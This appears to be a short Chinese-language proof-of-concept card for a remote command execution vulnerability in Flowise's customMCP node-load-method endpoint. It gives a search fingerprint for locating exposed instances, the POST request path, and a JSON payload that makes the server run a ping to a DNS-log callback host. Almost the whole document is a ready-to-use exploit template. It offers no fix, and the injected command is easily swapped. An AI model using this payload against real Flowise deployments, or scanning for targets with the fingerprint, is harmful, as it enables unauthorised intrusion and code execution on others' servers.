# FlowisecustomMCP存在远程命令执行漏洞

FlowisecustomMCP ｜ 命令执行 ｜ —
- **指纹**：`title="Flowise"`
- **请求**：`POST /api/v1/node-load-method/customMCP HTTP/1.1`

**Payload**
```
"inputs": {
"mcpServerConfig": {
"command": "ping",
"args": [
"www.dnslog.cn",
"-c",
"4"
]
},
"loadMethod": "listActions"
}
```
- **响应特征**：200 dnslog回显